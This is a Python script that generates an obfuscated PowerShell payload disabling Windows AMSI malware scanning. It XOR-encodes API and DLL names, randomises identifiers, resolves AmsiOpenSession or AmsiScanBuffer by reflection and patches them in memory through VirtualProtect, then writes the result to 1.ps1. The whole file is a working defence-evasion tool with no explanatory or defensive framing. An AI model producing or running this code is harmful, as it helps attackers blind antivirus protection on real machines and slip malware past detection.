import random
import string
from Crypto.Cipher import AES

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

strings = {"a","b","c","d","e","f","g","h","i","j","k","l","m","xa","xb","xc","xd","xe","xf","xg","xh"}

for s in strings:
	globals()['%s' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))


adll = ("amsi.dll")

astr = ("AmsiOpenSession")
system=("system.dll")
kernel=("kernel32.dll")
vproc1 = ("Virtua")
vproc2 = ("lProtect")
ascnbf1 = ("Ams")
ascnbf2 = ("iScanBuffer")

xorkey = random.choice(string.ascii_letters)

xoredA = xor(adll, xorkey)
xoredB = xor(astr, xorkey)
xoredC = xor(system, xorkey)
xoredD = xor(kernel, xorkey)
xoredE = xor(vproc1, xorkey)
xoredF = xor(vproc2, xorkey)
xoredG = xor(ascnbf1, xorkey)
xoredH = xor(ascnbf2, xorkey)

xoredBytesA = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredA))
xoredBytesB = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredB))
xoredBytesC = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredC))
xoredBytesD = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredD))
xoredBytesE = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredE))
xoredBytesF = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredF))
xoredBytesG = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredG))
xoredBytesH = ('0x' + ', 0x'.join(hex(ord(x))[2:] for x in xoredH))
xorkeyBytes = ('0x'.join(hex(ord(x))[:] for x in xorkey))


ps1 = f'''
function {a} {{

 Param ($moduleName, $functionName)

 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }}).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {{If($_.Name -eq "GetProcAddress") {{$tmp+=$_}}}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}}

function {b} {{
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.
 DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
 DefineDynamicModule('InMemoryModule', $false).
 DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
  [System.MulticastDelegate])
  $type.
 DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
 SetImplementationFlags('Runtime, Managed')
 $type.
  DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}}

[Byte[]] ${c} =  0x48, 0x31, 0xC0
[byte[]] ${l} = 0x90
[byte[]] ${m} = 0xc3
[Byte[]] ${k} =  ${m} + ${l} + ${l}
[Byte[]] ${xa} = {xoredBytesA}
[byte[]] ${xb} = {xoredBytesB}
[Byte[]] ${xc} = {xoredBytesC}
[byte[]] ${xd} = {xoredBytesD}
[Byte[]] ${xe} = {xoredBytesE}
[Byte[]] ${xf} = {xoredBytesF}
[Byte[]] ${xg} = {xoredBytesG}
[Byte[]] ${xh} = {xoredBytesH}

for($i=0; $i -lt ${xa}.count ; $i++)
{{
    ${xa}[$i] = ${xa}[$i] -bxor {xorkeyBytes}
}}

$a = [System.Text.Encoding]::ASCII.GetString(${xa})
$a
for($i=0; $i -lt ${xb}.count ; $i++)
{{
    ${xb}[$i] = ${xb}[$i] -bxor {xorkeyBytes}
}}


$b = [System.Text.Encoding]::ASCII.GetString(${xb})
$b
for($i=0; $i -lt ${xc}.count ; $i++)
{{
    ${xc}[$i] = ${xc}[$i] -bxor {xorkeyBytes}
}}

$c = [System.Text.Encoding]::ASCII.GetString(${xc})
$c
for($i=0; $i -lt ${xd}.count ; $i++)
{{
    ${xd}[$i] = ${xd}[$i] -bxor {xorkeyBytes}
}}

$d = [System.Text.Encoding]::ASCII.GetString(${xd})
$d

for($i=0; $i -lt ${xe}.count ; $i++)
{{
    ${xe}[$i] = ${xe}[$i] -bxor {xorkeyBytes}
}}
$e = [System.Text.Encoding]::ASCII.GetString(${xe})
$e

for($i=0; $i -lt ${xf}.count ; $i++)
{{
    ${xf}[$i] = ${xf}[$i] -bxor {xorkeyBytes}
}}

$f = [System.Text.Encoding]::ASCII.GetString(${xf})
$e = $e+$f
$e

for($i=0; $i -lt ${xg}.count ; $i++)
{{
    ${xg}[$i] = ${xg}[$i] -bxor {xorkeyBytes}
}}

$g = [System.Text.Encoding]::ASCII.GetString(${xg})

for($i=0; $i -lt ${xh}.count ; $i++)
{{
    ${xh}[$i] = ${xh}[$i] -bxor {xorkeyBytes}
}}

$h = [System.Text.Encoding]::ASCII.GetString(${xh})
$g = $g+$h

$aaar = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(({a} $d $e), ({b} @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

if ([Environment]::Is64BitProcess -eq [Environment]::Is64BitOperatingSystem)
{{
[IntPtr]${f} = {a} $a $b
$vp.Invoke(${f}, 3, 0x40, [ref]$aaar)
[System.Runtime.InteropServices.Marshal]::Copy(${c}, 0, ${f}, 3)
$vp.Invoke(${f}, 3, 0x20, [ref]$aaar)
}}
else
{{
[IntPtr]${j} = {a} $a $g
$vp.Invoke(${j} , 3, 0x40, [ref]$aaar)
[System.Runtime.InteropServices.Marshal]::Copy(${k}, 0, ${j} , 3)
$vp.Invoke(${j} , 3, 0x20, [ref]$aaar)
}}

'''
open("1.ps1", "w").write(ps1)

